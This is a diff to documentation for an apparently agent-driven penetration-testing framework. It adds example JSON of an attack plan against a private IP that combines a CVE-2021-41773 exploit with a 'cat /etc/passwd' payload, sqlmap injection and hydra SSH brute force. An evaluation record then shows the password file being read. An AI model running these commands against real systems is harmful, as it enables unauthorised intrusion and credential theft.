@@ -357,6 +357,172 @@ Scenario: SSH, port 22, remote access
 ✅ SUGGESTION: Check for SSH key auth, look for exposed keys
 ```
 
+**Stage 5: Tactical Planning** (Reasoner Output)
+```typescript
+// TacticalPlanObject - Complete attack plan with prediction metrics
+{
+  "plan_id": "plan_1738867200_a7b3c9d2e",
+  "target_ip": "192.168.1.50",
+  "context_hash": "sha256:3f4a9b2c1d8e...",
+  "created_at": "2026-02-06T10:30:00.000Z",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "exploit_runner",
+        "command_template": "python3 exploits/cve-2021-41773.py --target {target} --port {port}",
+        "parameters": {
+          "target": "192.168.1.50",
+          "port": 80,
+          "payload": "cat /etc/passwd"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2021-41773"
+        },
+        "hypothesis": {
+          "confidence_score": 0.85,
+          "rationale_tags": [
+            "apache_2.4.49",
+            "path_traversal",
+            "linux_target",
+            "poc_available"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(root:x:0:0|uid=0|vulnerable)",
+          "negative_pattern": "(404 Not Found|Connection refused|Forbidden)"
+        }
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "sqlmap",
+        "command_template": "sqlmap -u {url} --batch --level=2",
+        "parameters": {
+          "url": "http://192.168.1.50/login.php?id=1",
+          "technique": "BEUSTQ",
+          "threads": 4
+        },
+        "timeout_seconds": 60
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "SQLi",
+          "mitre_id": "T1190",
+          "cve_id": null
+        },
+        "hypothesis": {
+          "confidence_score": 0.72,
+          "rationale_tags": [
+            "mysql_detected",
+            "php_application",
+            "parameter_vulnerable"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "contains",
+          "match_pattern": "parameter is vulnerable",
+          "negative_pattern": "all tested parameters do not appear to be injectable"
+        }
+      }
+    },
+    {
+      "vector_id": "vec_03",
+      "priority": 3,
+      "action": {
+        "tool_name": "hydra",
+        "command_template": "hydra -L {userlist} -P {passlist} ssh://{target}",
+        "parameters": {
+          "target": "192.168.1.50",
+          "userlist": "/usr/share/wordlists/users.txt",
+          "passlist": "/usr/share/wordlists/rockyou-top1000.txt",
+          "threads": 4
+        },
+        "timeout_seconds": 120
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Brute Force",
+          "mitre_id": "T1110",
+          "cve_id": null
+        },
+        "hypothesis": {
+          "confidence_score": 0.35,
+          "rationale_tags": [
+            "ssh_open",
+            "weak_config",
+            "limited_wordlist"
+          ],
+          "expected_success": false
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "login:\\s+\\w+\\s+password:\\s+\\w+",
+          "negative_pattern": "(blocked|refused|too many attempts)"
+        }
+      }
+    }
+  ]
+}
+```
+
+**Key Features:**
+- **Prioritized Attack Vectors**: Ordered by likelihood of success
+- **Prediction Metrics**: Confidence scores and rationale for each attack
+- **Success Criteria**: Automated evaluation patterns for outcome labeling
+- **MITRE ATT&CK Mapping**: Each attack linked to tactics/techniques
+- **Context Hash**: Tracks which intelligence was used for planning
+
+**Stage 6: Evaluation Result** (After Execution)
+```typescript
+// EvaluationResult - Ground truth labeling by Evaluator Agent
+{
+  "vector_id": "vec_01",
+  "prediction": {
+    "classification": {
+      "attack_type": "RCE",
+      "mitre_id": "T1190",
+      "cve_id": "CVE-2021-41773"
+    },
+    "hypothesis": {
+      "confidence_score": 0.85,
+      "rationale_tags": ["apache_2.4.49", "path_traversal", "linux_target", "poc_available"],
+      "expected_success": true
+    },
+    "success_criteria": {
+      "match_type": "regex_match",
+      "match_pattern": "(root:x:0:0|uid=0|vulnerable)",
+      "negative_pattern": "(404 Not Found|Connection refused|Forbidden)"
+    }
+  },
+  "actual_output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n...",
+  "label": "true_positive",
+  "reasoning": "The actual output contains 'root:x:0:0' which matches the success pattern. The exploit successfully achieved path traversal and read /etc/passwd, confirming the vulnerability. The prediction of expected_success=true with confidence 0.85 was accurate.",
+  "confidence": 0.95,
+  "timestamp": "2026-02-06T10:30:45.000Z"
+}
+```
+
+**Evaluation Labels:**
+- **true_positive**: Attack succeeded as predicted (model was correct)
+- **false_positive**: Attack failed but was predicted to succeed (model was overconfident)
+- **false_negative**: Attack succeeded but was predicted to fail (model underestimated)
+- **true_negative**: Attack failed as predicted (model correctly assessed difficulty)
+
+**Training Data Generation:**
+The evaluation result is combined with the intelligence context to create training pairs for model improvement (RLHF/fine-tuning).
+
 ### SearchSploit MCP Server Setup
 
 The VulnLookup agent requires the SearchSploit MCP Server:
